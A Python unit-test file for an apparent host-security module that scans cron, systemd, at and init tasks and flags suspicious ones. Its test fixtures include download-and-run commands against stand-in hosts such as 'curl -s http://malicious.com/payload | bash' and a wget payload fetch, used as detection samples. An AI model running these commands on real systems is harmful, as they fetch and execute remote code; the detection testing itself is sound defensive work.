#!/usr/bin/env python3
"""
Unit tests for the Scheduled Tasks Analyzer module.
"""

import os
import sys
import unittest
from unittest.mock import patch, MagicMock, mock_open
import tempfile
import json
import sqlite3
from datetime import datetime, timedelta

# Add src directory to path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../src')))

from modules.scheduled_tasks import ScheduledTasksAnalyzer

class TestScheduledTasksAnalyzer(unittest.TestCase):
    """Test cases for the Scheduled Tasks Analyzer module"""
    
    def setUp(self):
        """Set up test environment"""
        # Create a temporary directory for the database
        self.temp_dir = tempfile.TemporaryDirectory()
        self.db_path = os.path.join(self.temp_dir.name, 'scheduled_tasks.db')
        
        self.config = {
            'database_path': self.db_path,
            'crontab_files': ['/etc/crontab', '/var/spool/cron/crontabs', '/etc/cron.d'],
            'systemd_timer_paths': ['/etc/systemd/system', '/usr/lib/systemd/system'],
            'at_job_paths': ['/var/spool/at'],
            'anacron_paths': ['/etc/anacrontab'],
            'other_task_paths': ['/etc/init.d', '/etc/rc.d']
        }
        
        # Initialize analyzer
        self.analyzer = ScheduledTasksAnalyzer(self.config)
    
    def tearDown(self):
        """Clean up after tests"""
        self.temp_dir.cleanup()
    
    @patch('os.path.exists')
    @patch('builtins.open', new_callable=mock_open, read_data="*/5 * * * * root /usr/local/bin/suspicious.sh\n")
    def test_analyze_cron_jobs(self, mock_file, mock_exists):
        """Test analyzing cron jobs"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Run test
        cron_tasks = self.analyzer._analyze_cron_jobs()
        
        # Verify results
        self.assertGreater(len(cron_tasks), 0)
        self.assertEqual(cron_tasks[0]['task_type'], 'cron')
        self.assertEqual(cron_tasks[0]['user'], 'root')
        self.assertEqual(cron_tasks[0]['schedule'], '*/5 * * * *')
        self.assertEqual(cron_tasks[0]['command'], '/usr/local/bin/suspicious.sh')
    
    @patch('os.path.exists')
    @patch('os.stat')
    @patch('pwd.getpwuid')
    @patch('builtins.open', new_callable=mock_open, read_data="#!/bin/bash\necho 'Daily task'\n")
    def test_parse_scheduled_script(self, mock_file, mock_pwd, mock_stat, mock_exists):
        """Test parsing scheduled scripts"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Mock stat result
        stat_mock = MagicMock()
        stat_mock.st_uid = 0
        stat_mock.st_mode = 0o755
        mock_stat.return_value = stat_mock
        
        # Mock pwd.getpwuid
        pwd_mock = MagicMock()
        pwd_mock.pw_name = 'root'
        mock_pwd.return_value = pwd_mock
        
        # Run test
        tasks_list = []
        self.analyzer._parse_scheduled_script('/etc/cron.daily/test.sh', tasks_list, '/etc/cron.daily')
        
        # Verify results
        self.assertEqual(len(tasks_list), 1)
        self.assertEqual(tasks_list[0]['task_type'], 'cron_script')
        self.assertEqual(tasks_list[0]['user'], 'root')
        self.assertEqual(tasks_list[0]['schedule'], '@daily')
        self.assertEqual(tasks_list[0]['command'], '/etc/cron.daily/test.sh')
    
    @patch('subprocess.run')
    def test_analyze_systemd_timers(self, mock_run):
        """Test analyzing systemd timers"""
        # Setup mock subprocess.run
        process_mock = MagicMock()
        process_mock.returncode = 0
        process_mock.stdout = """
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Mon 2023-01-01 00:00:00 UTC  5h 30min left Sun 2022-12-31 00:00:00 UTC 18h ago      system-update.timer          system-update.service
Mon 2023-01-01 00:00:00 UTC  5h 30min left Sun 2022-12-31 00:00:00 UTC 18h ago      suspicious-timer.timer       suspicious-timer.service

2 timers listed.
"""
        mock_run.return_value = process_mock
        
        # Mock _get_systemd_unit_info
        self.analyzer._get_systemd_unit_info = MagicMock()
        self.analyzer._get_systemd_unit_info.side_effect = [
            # Timer info
            {
                'Description': 'System Update Timer',
                'FragmentPath': '/etc/systemd/system/system-update.timer',
                'OnCalendar': '*-*-* 00:00:00'
            },
            # Service info
            {
                'Description': 'System Update Service',
                'FragmentPath': '/etc/systemd/system/system-update.service',
                'ExecStart': '/usr/bin/system-update',
                'User': 'root'
            },
            # Timer info for suspicious timer
            {
                'Description': 'Suspicious Timer',
                'FragmentPath': '/etc/systemd/system/suspicious-timer.timer',
                'OnCalendar': '*-*-* 03:00:00'
            },
            # Service info for suspicious timer
            {
                'Description': 'Suspicious Service',
                'FragmentPath': '/etc/systemd/system/suspicious-timer.service',
                'ExecStart': '/tmp/suspicious.sh',
                'User': 'nobody'
            }
        ]
        
        # Mock os.path.exists and open for timer and service files
        with patch('os.path.exists', return_value=True), \
             patch('builtins.open', mock_open(read_data="[Timer]\nOnCalendar=*-*-* 00:00:00\n")):
            # Run test
            systemd_tasks = self.analyzer._analyze_systemd_timers()
        
        # Verify results
        self.assertEqual(len(systemd_tasks), 2)
        self.assertEqual(systemd_tasks[0]['task_type'], 'systemd_timer')
        self.assertEqual(systemd_tasks[0]['task_name'], 'system-update.timer')
        self.assertEqual(systemd_tasks[0]['schedule'], '*-*-* 00:00:00')
        self.assertEqual(systemd_tasks[0]['command'], '/usr/bin/system-update')
        
        self.assertEqual(systemd_tasks[1]['task_type'], 'systemd_timer')
        self.assertEqual(systemd_tasks[1]['task_name'], 'suspicious-timer.timer')
        self.assertEqual(systemd_tasks[1]['schedule'], '*-*-* 03:00:00')
        self.assertEqual(systemd_tasks[1]['command'], '/tmp/suspicious.sh')
    
    @patch('subprocess.run')
    def test_analyze_at_jobs(self, mock_run):
        """Test analyzing at jobs"""
        # Setup mock subprocess.run for atq
        atq_mock = MagicMock()
        atq_mock.returncode = 0
        atq_mock.stdout = """1\tMon Jan  1 03:00:00 2023 a root
2\tMon Jan  1 04:00:00 2023 a nobody
"""
        
        # Setup mock subprocess.run for at -c
        at_c_mock = MagicMock()
        at_c_mock.returncode = 0
        at_c_mock.stdout = """#!/bin/sh
# atrun uid=0 gid=0
# mail root 0
umask 22
cd /
/usr/bin/wget http://malicious.com/payload
"""
        
        # Configure mock to return different values based on command
        def mock_run_side_effect(*args, **kwargs):
            if args[0][0] == 'atq':
                return atq_mock
            else:
                return at_c_mock
                
        mock_run.side_effect = mock_run_side_effect
        
        # Run test
        at_jobs = self.analyzer._analyze_at_jobs()
        
        # Verify results
        self.assertEqual(len(at_jobs), 2)
        self.assertEqual(at_jobs[0]['task_type'], 'at_job')
        self.assertEqual(at_jobs[0]['task_name'], 'at_job_1')
        self.assertEqual(at_jobs[0]['user'], 'root')
        self.assertEqual(at_jobs[0]['command'], '#!/bin/sh')
        self.assertIn('/usr/bin/wget', at_jobs[0]['content'])
    
    @patch('os.path.exists')
    @patch('builtins.open', new_callable=mock_open, read_data="1\t5\tcron.daily\t/usr/sbin/logrotate\n")
    def test_analyze_anacron_jobs(self, mock_file, mock_exists):
        """Test analyzing anacron jobs"""
        # Setup mocks
        mock_exists.return_value = True
        
        # Run test
        anacron_tasks = self.analyzer._analyze_anacron_jobs()
        
        # Verify results
        self.assertGreater(len(anacron_tasks), 0)
        self.assertEqual(anacron_tasks[0]['task_type'], 'anacron')
        self.assertEqual(anacron_tasks[0]['task_name'], 'cron.daily')
        self.assertEqual(anacron_tasks[0]['command'], '/usr/sbin/logrotate')
    
    @patch('os.listdir')
    @patch('os.path.exists')
    @patch('os.path.isdir')
    @patch('os.path.isfile')
    @patch('os.stat')
    @patch('pwd.getpwuid')
    @patch('builtins.open', new_callable=mock_open, read_data="#!/bin/bash\nwhile true; do\n  ping malicious.com\n  sleep 60\ndone\n")
    def test_analyze_other_tasks(self, mock_file, mock_pwd, mock_stat, mock_isfile, mock_isdir, mock_exists, mock_listdir):
        """Test analyzing other scheduling mechanisms"""
        # Setup mocks
        mock_exists.return_value = True
        mock_isdir.return_value = True
        mock_isfile.return_value = True
        mock_listdir.return_value = ['suspicious_script']
        
        # Mock stat result
        stat_mock = MagicMock()
        stat_mock.st_uid = 0
        stat_mock.st_mode = 0o755
        mock_stat.return_value = stat_mock
        
        # Mock pwd.getpwuid
        pwd_mock = MagicMock()
        pwd_mock.pw_name = 'root'
        mock_pwd.return_value = pwd_mock
        
        # Run test
        other_tasks = self.analyzer._analyze_other_tasks()
        
        # Verify results
        self.assertGreater(len(other_tasks), 0)
        self.assertEqual(other_tasks[0]['task_type'], 'init_script')
        self.assertEqual(other_tasks[0]['user'], 'root')
        self.assertEqual(other_tasks[0]['schedule'], 'Infinite loop')
        self.assertIn('ping malicious.com', other_tasks[0]['content'])
    
    def test_check_task_suspicious(self):
        """Test suspicious task detection"""
        # Test a benign task
        task_benign = {
            'task_type': 'cron',
            'command': '/usr/sbin/logrotate /etc/logrotate.conf',
            'user': 'root',
            'schedule': '0 0 * * *',
            'path': '/etc/cron.d/logrotate'
        }
        is_suspicious, reason = self.analyzer._check_task_suspicious(task_benign)
        self.assertFalse(is_suspicious)
        
        # Test a suspicious command
        task_suspicious_cmd = {
            'task_type': 'cron',
            'command': 'curl -s http://malicious.com/payload | bash',
            'user': 'root',
            'schedule': '0 3 * * *',
            'path': '/etc/cron.d/suspicious'
        }
        is_suspicious, reason = self.analyzer._check_task_suspicious(task_suspicious_cmd)
        self.assertTrue(is_suspicious)
        self.assertIn('suspicious command', reason.lower())
        
        # Test a suspicious time
        task_suspicious_time = {
            'task_type': 'cron',
            'command': '/usr/local/bin/backup.sh',
            'user': 'root',
            'schedule': '0 3 * * *',  # 3 AM is in our suspicious time window
            'path': '/etc/cron.d/backup'
        }
        is_suspicious, reason = self.analyzer._check_task_suspicious(task_suspicious_time)
        self.assertTrue(is_suspicious)
        self.assertIn('suspicious execution time', reason.lower())
        
        # Test a high frequency task
        task_high_freq = {
            'task_type': 'cron',
            'command': '/usr/local/bin/check.sh',
            'user': 'root',
            'schedule': '*/2 * * * *',  # Every 2 minutes
            'path': '/etc/cron.d/frequent_check'
        }
        is_suspicious, reason = self.analyzer._check_task_suspicious(task_high_freq)
        self.assertTrue(is_suspicious)
        self.assertIn('high frequency', reason.lower())
        
        # Test a task with obfuscation
        task_obfuscated = {
            'task_type': 'cron',
            'command': 'bash -c "$(curl -s http://example.com/hidden)"',
            'user': 'root',
            'schedule': '0 12 * * *',
            'path': '/etc/cron.d/obfuscated'
        }
        is_suspicious, reason = self.analyzer._check_task_suspicious(task_obfuscated)
        self.assertTrue(is_suspicious)
        self.assertIn('obfuscation', reason.lower())
    
    @patch('sqlite3.connect')
    def test_compare_with_baseline(self, mock_connect):
        """Test comparing current tasks with baseline"""
        # Setup mock database
        mock_conn = MagicMock()
        mock_cursor = MagicMock()
        mock_conn.cursor.return_value = mock_cursor
        mock_connect.return_value = mock_conn
        
        # Mock cursor fetchall for baseline tasks
        mock_cursor.fetchall.return_value = [
            # id, task_type, task_name, user, schedule, command, path, hash
            (1, 'cron', 'existing_task', 'root', '0 0 * * *', '/bin/existing.sh', '/etc/cron.d/existing', 'abc123'),
            (2, 'cron', 'changed_task', 'root', '0 0 * * *', '/bin/changed.sh', '/etc/cron.d/changed', 'def456'),
            (3, 'cron', 'removed_task', 'root', '0 0 * * *', '/bin/removed.sh', '/etc/cron.d/removed', 'ghi789')
        ]
        
        # Current tasks
        current_tasks = [
            {
                'task_type': 'cron',
                'task_name': 'existing_task',
                'user': 'root',
                'schedule': '0 0 * * *',
                'command': '/bin/existing.sh',
                'path': '/etc/cron.d/existing',
                'hash': 'abc123'  # Unchanged
            },
            {
                'task_type': 'cron',
                'task_name': 'changed_task',
                'user': 'root',
                'schedule': '0 0 * * *',
                'command': '/bin/changed.sh',
                'path': '/etc/cron.d/changed',
                'hash': 'xyz789'  # Changed hash
            },
            {
                'task_type': 'cron',
                'task_name': 'new_task',
                'user': 'root',
                'schedule': '0 0 * * *',
                'command': '/bin/new.sh',
                'path': '/etc/cron.d/new',
                'hash': 'new123'
            }
        ]
        
        # Run test
        results = self.analyzer._compare_with_baseline(current_tasks)
        
        # Verify results
        self.assertEqual(len(results['new_tasks']), 1)
        self.assertEqual(results['new_tasks'][0]['task_name'], 'new_task')
        
        self.assertEqual(len(results['modified_tasks']), 1)
        self.assertEqual(results['modified_tasks'][0]['task_name'], 'changed_task')
        self.assertIn('content', results['modified_tasks'][0]['changes'])
        
        self.assertEqual(len(results['removed_tasks']), 1)
        self.assertEqual(results['removed_tasks'][0]['task_name'], 'removed_task')
    
    @patch('sqlite3.connect')
    def test_establish_baseline(self, mock_connect):
        """Test establishing a baseline"""
        # Setup mock database
        mock_conn = MagicMock()
        mock_cursor = MagicMock()
        mock_conn.cursor.return_value = mock_cursor
        mock_connect.return_value = mock_conn
        
        # Mock the analyze method
        self.analyzer.analyze = MagicMock()
        self.analyzer.analyze.return_value = {
            'timestamp': datetime.now().isoformat(),
            'is_anomalous': False,
            'suspicious_tasks': [],
            'summary': {
                'total_tasks': 10,
                'suspicious_count': 0
            }
        }
        
        # Run test
        baseline = self.analyzer.establish_baseline()
        
        # Verify results
        self.assertIsNotNone(baseline)
        self.assertEqual(baseline['summary']['total_tasks'], 10)
        
        # Verify the database was updated to mark this as a baseline
        mock_cursor.execute.assert_called()
        args = mock_cursor.execute.call_args[0]
        self.assertIn('INSERT INTO scans', args[0])
        self.assertEqual(args[1][-2], 1)  # is_baseline = 1
        
        # Verify commit was called
        mock_conn.commit.assert_called_once()
    
    @patch('time.time')
    @patch('os.makedirs')
    def test_initialize_database(self, mock_makedirs, mock_time):
        """Test database initialization"""
        # Create a new test database in memory
        in_memory_db = sqlite3.connect(':memory:')
        
        # Apply the initialization method to it
        with patch('sqlite3.connect', return_value=in_memory_db):
            analyzer = ScheduledTasksAnalyzer(self.config)
        
        # Verify tables were created
        cursor = in_memory_db.cursor()
        
        # Check scheduled_tasks table
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='scheduled_tasks'")
        self.assertIsNotNone(cursor.fetchone())
        
        # Check task_changes table
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='task_changes'")
        self.assertIsNotNone(cursor.fetchone())
        
        # Check scans table
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='scans'")
        self.assertIsNotNone(cursor.fetchone())
        
        # Check indices
        cursor.execute("SELECT name FROM sqlite_master WHERE type='index' AND name='idx_task_type_path'")
        self.assertIsNotNone(cursor.fetchone())
        
        in_memory_db.close()
    
    @patch('sqlite3.connect')
    def test_get_scheduled_tasks(self, mock_connect):
        """Test retrieving scheduled tasks from database"""
        # Setup mock database
        mock_conn = MagicMock()
        mock_cursor = MagicMock()
        mock_conn.cursor.return_value = mock_cursor
        mock_connect.return_value = mock_conn
        
        # Mock cursor fetchall for tasks
        mock_cursor.fetchall.return_value = [
            # id, task_type, task_name, user, schedule, command, path, hash, first_seen, last_seen, is_suspicious, suspicious_reason
            (1, 'cron', 'normal_task', 'root', '0 0 * * *', '/bin/normal.sh', '/etc/cron.d/normal', 'abc123', 1640995200, 1640995200, 0, ''),
            (2, 'cron', 'suspicious_task', 'root', '*/5 * * * *', '/bin/suspicious.sh', '/etc/cron.d/suspicious', 'def456', 1640995200, 1640995200, 1, 'High frequency execution')
        ]
        
        # Test getting all tasks
        tasks = self.analyzer.get_scheduled_tasks()
        
        # Verify results
        self.assertEqual(len(tasks), 2)
        self.assertEqual(tasks[0]['task_name'], 'normal_task')
        self.assertEqual(tasks[1]['task_name'], 'suspicious_task')
        self.assertTrue(tasks[1]['is_suspicious'])
        
        # Reset mock and test getting only suspicious tasks
        mock_cursor.fetchall.reset_mock()
        mock_cursor.fetchall.return_value = [
            # Only the suspicious task
            (2, 'cron', 'suspicious_task', 'root', '*/5 * * * *', '/bin/suspicious.sh', '/etc/cron.d/suspicious', 'def456', 1640995200, 1640995200, 1, 'High frequency execution')
        ]
        
        suspicious_tasks = self.analyzer.get_scheduled_tasks(include_suspicious_only=True)
        
        # Verify query included WHERE clause
        args = mock_cursor.execute.call_args[0]
        self.assertIn("WHERE is_suspicious = 1", args[0])
        
        # Verify results
        self.assertEqual(len(suspicious_tasks), 1)
        self.assertEqual(suspicious_tasks[0]['task_name'], 'suspicious_task')
    
    @patch('sqlite3.connect')
    def test_get_scan_history(self, mock_connect):
        """Test retrieving scan history"""
        # Setup mock database
        mock_conn = MagicMock()
        mock_cursor = MagicMock()
        mock_conn.cursor.return_value = mock_cursor
        mock_connect.return_value = mock_conn
        
        # Mock cursor fetchall for scans
        mock_cursor.fetchall.return_value = [
            # id, timestamp, new_tasks, modified_tasks, removed_tasks, suspicious_tasks, is_baseline, summary
            (1, 1640995200, 10, 0, 0, 2, 1, '{"total_tasks": 10, "suspicious_count": 2}'),
            (2, 1641081600, 1, 2, 1, 3, 0, '{"total_tasks": 11, "suspicious_count": 3}')
        ]
        
        # Run test
        scans = self.analyzer.get_scan_history(limit=2)
        
        # Verify results
        self.assertEqual(len(scans), 2)
        self.assertEqual(scans[0]['id'], 1)
        self.assertTrue(scans[0]['is_baseline'])
        self.assertEqual(scans[0]['suspicious_tasks'], 2)
        
        self.assertEqual(scans[1]['id'], 2)
        self.assertFalse(scans[1]['is_baseline'])
        self.assertEqual(scans[1]['suspicious_tasks'], 3)
        
        # Verify limit was used in query
        args = mock_cursor.execute.call_args[0]
        self.assertIn("LIMIT ?", args[0])
        self.assertEqual(args[1][0], 2)

if __name__ == '__main__':
    unittest.main()